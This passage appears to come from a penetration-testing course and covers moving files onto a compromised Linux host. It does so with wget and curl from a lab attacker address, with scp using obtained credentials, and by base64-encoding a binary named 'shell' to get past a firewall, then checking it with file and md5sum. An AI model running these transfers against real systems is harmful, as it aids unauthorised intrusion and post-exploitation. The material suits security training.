## Using wget
First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
```shell
cd /tmp

python3 -m http.server 8000
```
Then:
```shell
wget http://10.10.14.1:8000/linenum.sh
```
If the remote server doesn't have wget, we can download it:
```shell
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

#### Using SCP
Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:
```shell
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
#### Using Base64
Some times, we could face a firewall that blocks us from downloading files from it, so we need to find another way. We can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.
```shell
base64 shell -w 0
#Output
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```
So we paste the output and use the `-d` to decode it, and pass it to the file named `shell`:
```shell
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

#### Validating File Transfers
To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:
```shell
file shell

#Output
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```
As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
```shell
md5sum shell

# Output
321de1d7e7c3735838890a72c9ae7d1d shell
```
Now, we can go to the remote server and run the same command on the file we transferred:
```shell
md5sum shell

#Output
321de1d7e7c3735838890a72c9ae7d1d shell
```
As we can see, both files have the same md5 hash, meaning the file was transferred correctly.
